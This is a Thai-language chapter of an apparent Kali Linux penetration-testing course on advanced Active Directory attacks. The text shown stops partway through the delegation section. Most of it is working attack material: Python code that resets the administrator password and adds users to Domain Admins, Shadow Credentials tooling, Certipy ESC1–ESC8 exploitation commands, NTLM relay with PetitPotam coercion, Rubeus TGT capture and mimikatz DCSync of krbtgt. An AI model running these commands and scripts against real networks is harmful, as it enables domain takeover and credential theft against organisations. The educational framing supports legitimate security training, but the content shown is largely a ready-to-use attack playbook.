# Part 94: Active Directory Advanced — การโจมตี Active Directory ขั้นสูง

> **หลักสูตร Kali Linux จากพื้นฐานสู่ระดับโลก — ขั้นตอนที่ 940-960**

← [Part 93: Advanced Network Attacks](Part-93-Advanced-Network-Attacks.md) | [Part 95: Red Team Operations](Part-95-Red-Team-Operations.md) →

---

## สารบัญ

1. [BloodHound และ SharpHound ขั้นสูง](#1-bloodhound-และ-sharphound-ขั้นสูง)
2. [ACL Abuse และ DACL Attacks](#2-acl-abuse-และ-dacl-attacks)
3. [Shadow Credentials Attack](#3-shadow-credentials-attack)
4. [Active Directory Certificate Services (ADCS)](#4-active-directory-certificate-services-adcs)
5. [ESC1-ESC8 Privilege Escalation](#5-esc1-esc8-privilege-escalation)
6. [Unconstrained Delegation Abuse](#6-unconstrained-delegation-abuse)
7. [Constrained Delegation Abuse](#7-constrained-delegation-abuse)
8. [Resource-Based Constrained Delegation (RBCD)](#8-resource-based-constrained-delegation-rbcd)
9. [AdminSDHolder Abuse](#9-adminsdholder-abuse)
10. [DCShadow Attack](#10-dcshadow-attack)
11. [Cross-Forest Trust Attacks](#11-cross-forest-trust-attacks)
12. [Azure AD Hybrid Attacks](#12-azure-ad-hybrid-attacks)
13. [Advanced Persistence Techniques](#13-advanced-persistence-techniques)
14. [AD Forensics และ Detection](#14-ad-forensics-และ-detection)
15. [Defense และ Hardening](#15-defense-และ-hardening)

---

## 1. BloodHound และ SharpHound ขั้นสูง

### การติดตั้งและใช้งาน BloodHound CE

```bash
# ติดตั้ง BloodHound Community Edition
docker pull specterops/bloodhound-ce
docker compose up -d

# หรือใช้ npm
npm install -g @specterops/bloodhound-cli
bloodhound-cli install
bloodhound-cli start

# เข้าถึงที่ http://localhost:8080
# username: admin / password: bloodhoundcommunityedition
```

### SharpHound Collection Modes

```bash
# รวบรวมข้อมูลทั้งหมด
.\SharpHound.exe -c All --zipfilename output.zip

# เฉพาะ Session data (ใช้เวลาน้อยกว่า)
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00

# DCOnly mode — ดึงข้อมูลจาก DC เท่านั้น (เงียบกว่า)
.\SharpHound.exe -c DCOnly

# Stealth mode
.\SharpHound.exe -c All --Stealth

# ระบุ Domain Controller
.\SharpHound.exe -c All --DomainController dc01.corp.local --Domain corp.local

# ใช้ credentials อื่น
.\SharpHound.exe -c All --LdapUsername pentest --LdapPassword 'P@ssw0rd!'

# รัน จาก Linux ด้วย bloodhound-python
pip install bloodhound
bloudhound-python -d corp.local -u pentest -p 'P@ssw0rd!' -c All -ns 192.168.1.10
```

### Cypher Queries ขั้นสูง

```cypher
// หา Shortest Path จาก Domain Users ไปยัง Domain Admins
MATCH (g:Group {name: 'DOMAIN USERS@CORP.LOCAL'})
MATCH (da:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
MATCH p=shortestPath((g)-[*1..10]->(da))
RETURN p

// หา users ที่มี DCSync rights
MATCH (n)-[r:DCSync|AllExtendedRights|GenericAll]->(d:Domain)
RETURN n.name, type(r), d.name

// หา computers ที่มี Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation: true})
WHERE c.name <> 'DC01.CORP.LOCAL'
RETURN c.name, c.operatingsystem

// หา users ที่มี Password Never Expires
MATCH (u:User {passwordneverexpires: true, enabled: true})
RETURN u.name, u.lastlogon, u.pwdlastset

// หา Kerberoastable accounts ที่มี high privileges
MATCH (u:User {hasspn: true})
MATCH p=shortestPath((u)-[*1..5]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN u.name, u.serviceprincipalnames

// หา ACL path ทั้งหมดที่นำไปสู่ DA
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|Owns|AllExtendedRights]->(t)
MATCH p=shortestPath((t)-[*1..5]->(da:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN u.name, type(r), t.name

// หา owned objects และ paths ต่อ
MATCH p=shortestPath((owned {owned: true})-[*1..]->(target {highvalue: true}))
RETURN p

// หา computers ที่ Domain Admins เคย login
MATCH (da:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})<-[:MemberOf*1..]-(u:User)
MATCH (u)-[:HasSession]->(c:Computer)
RETURN DISTINCT c.name, c.operatingsystem

// หา AS-REP Roastable accounts
MATCH (u:User {dontreqpreauth: true, enabled: true})
RETURN u.name, u.description
```

### Python BloodHound Analysis

```python
#!/usr/bin/env python3
"""bloodhound_analyzer.py — วิเคราะห์ข้อมูล BloodHound อัตโนมัติ"""

import json
import zipfile
from pathlib import Path
from collections import defaultdict
from neo4j import GraphDatabase

class BloodHoundAnalyzer:
    def __init__(self, uri="bolt://localhost:7687", user="neo4j", password="bloodhound"):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))
        self.findings = []
    
    def run_query(self, query, params=None):
        with self.driver.session() as session:
            return list(session.run(query, params or {}))
    
    def find_attack_paths(self, domain):
        """หา attack paths ทั้งหมดจาก low-priv ไปยัง DA"""
        print("[*] Finding attack paths to Domain Admins...")
        
        queries = {
            "kerberoastable_to_da": """
                MATCH (u:User {hasspn: true, enabled: true})
                MATCH p=shortestPath((u)-[*1..5]->(g:Group))
                WHERE g.name STARTS WITH 'DOMAIN ADMINS'
                RETURN u.name as user, length(p) as hops
                ORDER BY hops
            """,
            "asreproast_to_da": """
                MATCH (u:User {dontreqpreauth: true, enabled: true})
                MATCH p=shortestPath((u)-[*1..5]->(g:Group))
                WHERE g.name STARTS WITH 'DOMAIN ADMINS'
                RETURN u.name as user, length(p) as hops
                ORDER BY hops
            """,
            "unconstrained_delegation": """
                MATCH (c:Computer {unconstraineddelegation: true})
                WHERE NOT c.name STARTS WITH 'DC'
                RETURN c.name as computer, c.operatingsystem as os
            """,
            "admin_to_computers": """
                MATCH (da:Group)
                WHERE da.name STARTS WITH 'DOMAIN ADMINS'
                MATCH (da)<-[:MemberOf*1..]-(u:User)
                MATCH (u)-[:AdminTo]->(c:Computer)
                RETURN u.name as admin_user, c.name as computer
                LIMIT 50
            """
        }
        
        results = {}
        for name, query in queries.items():
            rows = self.run_query(query)
            results[name] = [dict(r) for r in rows]
            print(f"  [{name}]: {len(rows)} results")
        
        return results
    
    def find_acl_abuse_paths(self):
        """หา ACL misconfigurations"""
        print("[*] Finding ACL abuse paths...")
        
        acl_query = """
            MATCH (u:User {enabled: true})
            MATCH (u)-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|Owns|AllExtendedRights]->(t)
            WHERE NOT (u)-[:MemberOf*1..]->(:Group {name: 'DOMAIN ADMINS@' + u.domain})
            RETURN u.name as user, type(r) as relationship, 
                   labels(t)[0] as target_type, t.name as target
            ORDER BY u.name
            LIMIT 100
        """
        
        results = self.run_query(acl_query)
        acl_abuses = [dict(r) for r in results]
        
        # จัดกลุ่มตาม user
        by_user = defaultdict(list)
        for abuse in acl_abuses:
            by_user[abuse['user']].append(abuse)
        
        print(f"  Found {len(by_user)} users with dangerous ACL rights")
        return dict(by_user)
    
    def find_shadow_credentials_candidates(self):
        """หา accounts ที่สามารถทำ Shadow Credentials ได้"""
        query = """
            MATCH (u)-[r:GenericWrite|GenericAll|Owns|WriteDACL]->(t:User|Computer)
            RETURN u.name as attacker, type(r) as right, 
                   labels(t)[0] as target_type, t.name as target
        """
        results = self.run_query(query)
        return [dict(r) for r in results]
    
    def generate_report(self, domain, output_file="bloodhound_report.json"):
        """สร้าง report ครบถ้วน"""
        print(f"[*] Generating comprehensive report for {domain}")
        
        report = {
            "domain": domain,
            "attack_paths": self.find_attack_paths(domain),
            "acl_abuses": self.find_acl_abuse_paths(),
            "shadow_credentials": self.find_shadow_credentials_candidates(),
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {output_file}")
        return report

# การใช้งาน
if __name__ == "__main__":
    analyzer = BloodHoundAnalyzer()
    report = analyzer.generate_report("CORP.LOCAL")
```

---

## 2. ACL Abuse และ DACL Attacks

### ทำความเข้าใจ Active Directory ACLs

```
ACL (Access Control List) ใน AD ประกอบด้วย:
- DACL (Discretionary ACL): กำหนดว่าใครมีสิทธิ์ทำอะไรกับ object
- SACL (System ACL): กำหนด audit logging
- ACE (Access Control Entry): แต่ละ entry ใน DACL

ACE Rights ที่สำคัญสำหรับ pentester:
- GenericAll: Full control — สามารถทำได้ทุกอย่าง
- GenericWrite: เขียน attributes ได้
- WriteOwner: เปลี่ยน owner ได้ → จากนั้น owner สามารถเปลี่ยน DACL
- WriteDACL: เปลี่ยน ACL ได้ → เพิ่มสิทธิ์ตัวเองได้
- AllExtendedRights: สิทธิ์ extended ทั้งหมด (reset password, DCSync)
- ForceChangePassword: บังคับ reset password
- Self: write to self-relative attributes
- WriteProperty: เขียน property เฉพาะ
```

### PowerView ACL Enumeration

```powershell
# นำเข้า PowerView
Import-Module .\PowerView.ps1

# หา ACLs ที่น่าสนใจสำหรับ user เฉพาะ
Get-ObjectAcl -Identity "targetuser" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL"} |
    Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectDN

# หา ACLs ที่น่าสนใจทั้ง domain
Find-InterestingDomainAcl -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -match "Domain Users|Everyone|Authenticated Users"}

# ตรวจสอบสิทธิ์ของ user เฉพาะต่อ objects ทั้ง domain
Get-DomainObjectAcl -Identity * -ResolveGUIDs |
    Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser pentest).objectsid}

# หา Domain Objects ที่ user ปัจจุบันมีสิทธิ์ WriteDACL
Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {($_.ActiveDirectoryRights -match "WriteDACL") -and
                  ($_.SecurityIdentifier -match (Get-DomainUser $env:USERNAME).objectsid)}
```

### GenericAll Abuse

```python
#!/usr/bin/env python3
"""acl_abuse.py — สาธิตการใช้ประโยชน์จาก ACL misconfigurations"""

from impacket.ldap import ldap, ldaptypes
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE
from ldap3.protocol.microsoft import security_descriptor_control
import struct

class ADACLAbuser:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        self._connect()
    
    def _connect(self):
        server = Server(self.dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{self.domain}\\{self.username}',
            password=self.password,
            authentication='NTLM',
            auto_bind=True
        )
        print(f"[+] Connected to {self.dc_ip} as {self.username}")
    
    def get_user_dn(self, username):
        """ดึง Distinguished Name ของ user"""
        self.conn.search(
            self.base_dn,
            f'(sAMAccountName={username})',
            attributes=['distinguishedName', 'objectSid']
        )
        if self.conn.entries:
            return str(self.conn.entries[0].distinguishedName)
        return None
    
    def force_change_password(self, target_user, new_password):
        """
        ใช้ ForceChangePassword right เพื่อ reset password
        ต้องการ: GenericAll หรือ ForceChangePassword ACE บน target user
        """
        target_dn = self.get_user_dn(target_user)
        if not target_dn:
            print(f"[-] User {target_user} not found")
            return False
        
        # ใช้ LDAP password reset
        encoded_password = f'"{new_password}"'.encode('utf-16-le')
        changes = {'unicodePwd': [(MODIFY_REPLACE, [encoded_password])]}
        
        self.conn.modify(target_dn, changes)
        if self.conn.result['result'] == 0:
            print(f"[+] Password changed for {target_user} -> {new_password}")
            return True
        else:
            print(f"[-] Failed: {self.conn.result['description']}")
            return False
    
    def add_to_group(self, target_user, target_group):
        """
        เพิ่ม user เข้า group
        ต้องการ: GenericAll หรือ WriteProperty บน group
        """
        user_dn = self.get_user_dn(target_user)
        
        # หา group DN
        self.conn.search(
            self.base_dn,
            f'(sAMAccountName={target_group})',
            attributes=['distinguishedName']
        )
        if not self.conn.entries:
            print(f"[-] Group {target_group} not found")
            return False
        
        group_dn = str(self.conn.entries[0].distinguishedName)
        
        # เพิ่ม member
        changes = {'member': [(MODIFY_REPLACE, [user_dn])]}
        self.conn.modify(group_dn, changes)
        
        if self.conn.result['result'] == 0:
            print(f"[+] Added {target_user} to {target_group}")
            return True
        else:
            # ลอง add แทน replace
            from ldap3 import MODIFY_ADD
            changes = {'member': [(MODIFY_ADD, [user_dn])]}
            self.conn.modify(group_dn, changes)
            if self.conn.result['result'] == 0:
                print(f"[+] Added {target_user} to {target_group}")
                return True
            print(f"[-] Failed to add to group: {self.conn.result}")
            return False
    
    def grant_dcsync(self, target_user):
        """
        ให้ DCSync rights แก่ user
        ต้องการ: WriteDACL บน Domain object
        
        DCSync ต้องการ extended rights:
        - DS-Replication-Get-Changes (1131f6aa-...)
        - DS-Replication-Get-Changes-All (1131f6ad-...)
        """
        print(f"[*] Granting DCSync rights to {target_user}...")
        
        # ใช้ impacket หรือ PowerView แทน
        # PowerView command:
        cmd = f"Add-DomainObjectAcl -TargetIdentity '{self.domain}' -PrincipalIdentity '{target_user}' -Rights DCSync -Verbose"
        print(f"[*] Run in PowerView: {cmd}")
        
        return cmd
    
    def write_spn(self, target_user, spn_value):
        """
        เขียน SPN เพื่อทำ Targeted Kerberoasting
        ต้องการ: GenericWrite หรือ WriteProperty (servicePrincipalName) บน user
        """
        target_dn = self.get_user_dn(target_user)
        if not target_dn:
            return False
        
        from ldap3 import MODIFY_ADD
        changes = {'servicePrincipalName': [(MODIFY_ADD, [spn_value])]}
        self.conn.modify(target_dn, changes)
        
        if self.conn.result['result'] == 0:
            print(f"[+] SPN '{spn_value}' added to {target_user}")
            print(f"[*] Now Kerberoast: GetUserSPNs.py {self.domain}/{self.username}:{self.password} -dc-ip {self.dc_ip} -request-user {target_user}")
            return True
        return False

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    abuser = ADACLAbuser(
        domain="corp.local",
        dc_ip="192.168.1.10",
        username="lowpriv",
        password="Password123!"
    )
    
    # 1. ถ้ามี GenericAll บน admin user -> reset password
    abuser.force_change_password("administrator", "Hacked@123!")
    
    # 2. ถ้ามี GenericAll บน group -> เพิ่มตัวเองเข้า DA
    abuser.add_to_group("lowpriv", "Domain Admins")
    
    # 3. ถ้ามี GenericWrite บน user -> เพิ่ม SPN แล้ว Kerberoast
    abuser.write_spn("targetuser", "http/fake.corp.local")
```

---

## 3. Shadow Credentials Attack

### Shadow Credentials คืออะไร

```
Shadow Credentials ใช้ประโยชน์จาก msDS-KeyCredentialLink attribute
ซึ่งใช้สำหรับ Windows Hello for Business (WHfB)

ผู้โจมตีที่มี GenericWrite/GenericAll บน user/computer object
สามารถเพิ่ม self-signed certificate key ลงใน msDS-KeyCredentialLink
จากนั้นใช้ certificate นั้น authenticate แทน password

ขั้นตอน:
1. สร้าง RSA key pair + self-signed certificate
2. เพิ่ม KeyCredential ลงใน msDS-KeyCredentialLink ของ target
3. ใช้ certificate + PKINIT ขอ TGT
4. ใช้ TGT ขอ NTLM hash ผ่าน U2U (User-to-User)
```

### Pywhisker — Shadow Credentials Tool

```bash
# ติดตั้ง pywhisker
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker
pip install -r requirements.txt

# ดู current KeyCredentials ของ target
python3 pywhisker.py -d corp.local -u pentest -p 'P@ssw0rd!' \
    --dc-ip 192.168.1.10 \
    -t targetuser \
    --action list

# เพิ่ม Shadow Credential (สร้าง key pair + เพิ่มใน AD)
python3 pywhisker.py -d corp.local -u pentest -p 'P@ssw0rd!' \
    --dc-ip 192.168.1.10 \
    -t targetuser \
    --action add \
    --filename shadow_cert

# ผลลัพธ์: shadow_cert.pfx และ shadow_cert.pem

# ใช้ cert ขอ TGT ด้วย PKINITtools
python3 gettgtpkinit.py corp.local/targetuser \
    -cert-pfx shadow_cert.pfx \
    -pfx-pass <password_from_pywhisker> \
    targetuser.ccache

# ดึง NT hash จาก TGT (U2U)
export KRB5CCNAME=targetuser.ccache
python3 getnthash.py corp.local/targetuser \
    -key <AS-REP_key_from_gettgtpkinit>

# ใช้ NT hash สำหรับ PTH
psexec.py -hashes :NTHash corp.local/targetuser@target_ip
```

### Python Shadow Credentials Implementation

```python
#!/usr/bin/env python3
"""shadow_credentials.py — Shadow Credentials attack implementation"""

import base64
import datetime
import os
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from ldap3 import Server, Connection, ALL, MODIFY_ADD, MODIFY_DELETE
import struct
import hashlib

class ShadowCredentialsAttack:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        self._connect()
    
    def _connect(self):
        server = Server(self.dc_ip, get_info=ALL, use_ssl=False)
        self.conn = Connection(
            server,
            user=f'{self.domain}\\{self.username}',
            password=self.password,
            authentication='NTLM',
            auto_bind=True
        )
    
    def generate_key_and_cert(self, target_upn):
        """สร้าง RSA key pair และ self-signed certificate"""
        print("[*] Generating RSA key pair...")
        
        # สร้าง RSA 2048-bit key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # สร้าง self-signed certificate
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, target_upn),
        ])
        
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(subject)
            .public_key(private_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .sign(private_key, hashes.SHA256())
        )
        
        print(f"[+] Certificate generated for {target_upn}")
        return private_key, cert
    
    def build_key_credential(self, public_key, cert):
        """สร้าง KeyCredential blob สำหรับ msDS-KeyCredentialLink"""
        # KeyCredential structure (simplified)
        # แต่ละ entry คือ TLV (Tag-Length-Value)
        
        # Public key DER encoded
        pub_key_der = public_key.public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # สร้าง Key ID (SHA256 ของ public key)
        key_id = hashlib.sha256(pub_key_der).digest()
        
        # สร้าง timestamp
        now = datetime.datetime.utcnow()
        epoch = datetime.datetime(1601, 1, 1)
        ts = int((now - epoch).total_seconds() * 10_000_000)
        ts_bytes = struct.pack('<q', ts)
        
        print(f"[+] Key ID: {key_id.hex()}")
        print(f"[*] To complete attack, use pywhisker or Whisker (.NET)")
        print(f"[*] Command: pywhisker.py -d {self.domain} -u {self.username} -p '{self.password}' --dc-ip {self.dc_ip} -t TARGET --action add")
        
        return key_id
    
    def list_shadow_credentials(self, target_user):
        """ดูรายการ KeyCredentials บน target"""
        self.conn.search(
            self.base_dn,
            f'(sAMAccountName={target_user})',
            attributes=['msDS-KeyCredentialLink', 'distinguishedName']
        )
        
        if not self.conn.entries:
            print(f"[-] User {target_user} not found")
            return []
        
        entry = self.conn.entries[0]
        creds = entry['msDS-KeyCredentialLink'].values
        
        if creds:
            print(f"[+] Found {len(creds)} shadow credentials on {target_user}")
            for i, cred in enumerate(creds):
                print(f"  [{i}] {cred[:50]}...")
        else:
            print(f"[*] No shadow credentials on {target_user}")
        
        return creds
    
    def clear_shadow_credentials(self, target_user):
        """ลบ shadow credentials ทั้งหมด (cleanup)"""
        self.conn.search(
            self.base_dn,
            f'(sAMAccountName={target_user})',
            attributes=['distinguishedName']
        )
        
        if self.conn.entries:
            dn = str(self.conn.entries[0].distinguishedName)
            self.conn.modify(dn, {'msDS-KeyCredentialLink': [(MODIFY_DELETE, [])]})
            print(f"[+] Cleared shadow credentials on {target_user}")

# การใช้งาน
if __name__ == "__main__":
    attack = ShadowCredentialsAttack(
        domain="corp.local",
        dc_ip="192.168.1.10",
        username="lowpriv",
        password="Password123!"
    )
    
    # ตรวจสอบ credentials ที่มีอยู่
    attack.list_shadow_credentials("targetuser")
    
    # สร้าง key สำหรับ shadow credentials
    priv_key, cert = attack.generate_key_and_cert("targetuser@corp.local")
    attack.build_key_credential(priv_key.public_key(), cert)
```

---

## 4. Active Directory Certificate Services (ADCS)

### ADCS Architecture

```
ADCS (Active Directory Certificate Services) ใน Windows:

├── Certificate Authority (CA)
│   ├── Enterprise CA (ใช้ AD)
│   └── Standalone CA (ไม่ใช้ AD)
├── Certificate Templates
│   ├── กำหนดว่าใครสามารถ request certificate ได้
│   └── กำหนด EKU (Extended Key Usage)
├── Certificate Enrollment
│   ├── Web Enrollment (HTTP)
│   ├── CES/CEP (Certificate Enrollment Service)
│   └── LDAP
└── Certificate Distribution
    ├── CRL (Certificate Revocation List)
    └── OCSP

EKU ที่สำคัญ:
- Client Authentication (1.3.6.1.5.5.7.3.2) - ใช้ login
- Smart Card Logon (1.3.6.1.4.1.311.20.2.2) - ใช้ login
- Any Purpose (2.5.29.37.0) - ใช้ได้ทุกอย่าง
- No EKU - ใช้ได้ทุกอย่าง (SubCA)
```

### Certipy — ADCS Enumeration และ Attack

```bash
# ติดตั้ง certipy
pip install certipy-ad

# Enumerate ADCS
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -vulnerable -stdout

# หา vulnerable templates
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -vulnerable
# สร้างไฟล์ output: corp.local_Certipy.json, corp.local_Certipy.txt, corp.local_Certipy.zip

# ดู template ทั้งหมด
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -stdout | grep -A5 'Template Name'

# Request certificate ด้วย ESC1 (บน template ที่ vulnerable)
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'VulnerableTemplate' \
    -upn administrator@corp.local \
    -dc-ip 192.168.1.10
# ได้ไฟล์: administrator.pfx

# ใช้ certificate ขอ TGT
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# ได้ NTLM hash และ TGT

# ทำ Pass-the-Hash ด้วย NTLM ที่ได้
wmiexec.py -hashes :NTHash corp.local/administrator@dc01.corp.local

# ESC8 — Web Enrollment HTTP endpoint
# เปิด responder บน interface
responder -I eth0

# relay ไปยัง ADCS web enrollment
certipy relay -ca 192.168.1.10 -target 'http://ca.corp.local/certsrv/'

# หรือใช้ ntlmrelayx กับ ADCS
ntlmrelayx.py -t http://ca.corp.local/certsrv/ --adcs --template DomainController
```

---

## 5. ESC1-ESC8 Privilege Escalation

### ESC1 — Template Misconfiguration (SAN)

```
เงื่อนไข ESC1:
1. Enterprise CA อนุญาตให้ low-priv users enroll
2. Template อนุญาต requestor-supplied SAN (ENROLLEE_SUPPLIES_SUBJECT)
3. Template มี EKU: Client Authentication หรือ Smart Card Logon หรือ Any Purpose
4. Manager Approval ปิดอยู่

ผลลัพธ์: สามารถ request cert สำหรับ administrator ได้
```

```bash
# ตรวจสอบ ESC1 ด้วย Certipy
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -vulnerable -stdout | grep -A20 'ESC1'

# Exploit ESC1
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'User' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

certipy auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 192.168.1.10
```

### ESC2 — Any Purpose EKU

```bash
# ESC2: Template มี Any Purpose EKU หรือไม่มี EKU
# สามารถใช้ cert เป็น sub-CA ได้

# Request ESC2 cert
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'ESC2Template' \
    -dc-ip 192.168.1.10

# ใช้ cert นี้ request อีก cert สำหรับ admin
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'User' \
    -on-behalf-of 'administrator' \
    -pfx pentest.pfx \
    -dc-ip 192.168.1.10
```

### ESC3 — Certificate Request Agent

```bash
# ESC3: Template มี Certificate Request Agent EKU
# ทำให้สามารถ enroll on behalf of อื่นได้

# Step 1: Enroll ใน ESC3 template (Certificate Request Agent)
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'ESC3-CRA' \
    -dc-ip 192.168.1.10

# Step 2: ใช้ agent cert ขอ cert สำหรับ admin
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'User' \
    -on-behalf-of 'corp\administrator' \
    -pfx pentest.pfx \
    -dc-ip 192.168.1.10

# Step 3: auth
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

### ESC4 — Template Modification

```bash
# ESC4: User มี Write/GenericWrite บน Template object
# สามารถ modify template ให้กลาย ESC1 ได้

# ดู templates ที่ modify ได้
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -stdout | grep -B5 'ESC4'

# Exploit: modify template แล้ว exploit เหมือน ESC1
certipy template -u pentest@corp.local -p 'P@ssw0rd!' \
    -template 'VulnTemplate' \
    -save-old \
    -dc-ip 192.168.1.10

# จากนั้น request cert เหมือน ESC1
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'VulnTemplate' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

# Restore template
certipy template -u pentest@corp.local -p 'P@ssw0rd!' \
    -template 'VulnTemplate' \
    -configuration old.json \
    -dc-ip 192.168.1.10
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

```bash
# ESC6: CA มี flag EDITF_ATTRIBUTESUBJECTALTNAME2 เปิดอยู่
# ทำให้ทุก template กลาย ESC1

# ตรวจสอบ flag
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -stdout | grep 'EDITF_ATTRIBUTESUBJECTALTNAME2'

# ถ้ามี flag -> request cert พร้อม SAN ของ admin
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'User' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10
```

### ESC7 — CA Officer/Manager

```bash
# ESC7: User มีสิทธิ์ ManageCA หรือ ManageCertificates

# ตรวจสอบ
certipy find -u pentest@corp.local -p 'P@ssw0rd!' -dc-ip 192.168.1.10 -stdout | grep 'ESC7'

# ถ้า ManageCA: เปิด flag EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -enable-template 'SubCA' \
    -dc-ip 192.168.1.10

# Request cert (จะถูก deny เพราะ SubCA)
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -template 'SubCA' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

# Approve pending request
certipy ca -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -issue-request <request_id> \
    -dc-ip 192.168.1.10

# ดึง cert
certipy req -u pentest@corp.local -p 'P@ssw0rd!' \
    -ca 'corp-DC01-CA' \
    -retrieve <request_id> \
    -dc-ip 192.168.1.10
```

### ESC8 — NTLM Relay to ADCS Web Enrollment

```bash
# ESC8: ADCS Web Enrollment ไม่มี HTTPS หรือ Extended Protection
# สามารถ relay NTLM authentication ไปยัง /certsrv/ ได้

# Setup relay
python3 ntlmrelayx.py -t http://ca.corp.local/certsrv/ \
    --adcs \
    --template DomainController \
    --no-http-server \
    -smb2support

# Coerce authentication จาก DC
python3 PetitPotam.py <attacker_ip> <dc_ip>
# หรือ
python3 coercer.py -u pentest -p 'P@ssw0rd!' -d corp.local \
    -t dc01.corp.local \
    -l <attacker_ip>

# นำ base64 cert ไป authenticate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

---

## 6. Unconstrained Delegation Abuse

### Unconstrained Delegation คืออะไร

```
เมื่อ computer มี Unconstrained Delegation:
- เมื่อ user เชื่อมต่อมา, KDC จะส่ง user's TGT ไปใน service ticket
- Computer เก็บ TGT นั้นไว้ใน memory
- Computer สามารถใช้ TGT นั้น authenticate ไปยัง service ใดก็ได้
  ในนาม user คนนั้น

วิธี exploit:
1. หา computer ที่มี Unconstrained Delegation
2. มีสิทธิ์ local admin บน computer นั้น
3. Coerce DC เชื่อมต่อมาหา computer
4. ดึง TGT ของ DC จาก memory
5. ใช้ TGT ของ DC ทำ DCSync
```

```bash
# ค้นหา computers ที่มี Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,ServicePrincipalName

# หรือด้วย ldapsearch
ldapsearch -x -H ldap://192.168.1.10 -D 'corp\pentest' -w 'P@ssw0rd!' \
    -b 'DC=corp,DC=local' \
    '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
    name userAccountControl

# บน computer ที่มี unconstrained delegation
# รอ TGT ด้วย Rubeus monitor
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce DC authentication ด้วย PetitPotam
python3 PetitPotam.py <computer_with_delegation_ip> <dc_ip>

# หรือ PrinterBug
python3 printerbug.py 'corp/pentest:P@ssw0rd!'@dc01.corp.local <computer_ip>

# Rubeus จะตรวจจับ TGT ใหม่และแสดงผล
# นำ base64 TGT ไปใช้
.\Rubeus.exe ptt /ticket:<base64_TGT>

# ทำ DCSync
mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:corp.local
```

```python
#!/usr/bin/env python3
"""unconstrained_delegation.py — ตรวจหาและจัดการ Unconstrained Delegation"""

from ldap3 import Server, Connection, ALL
import subprocess

class UnconstrainedDelegationHunter:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
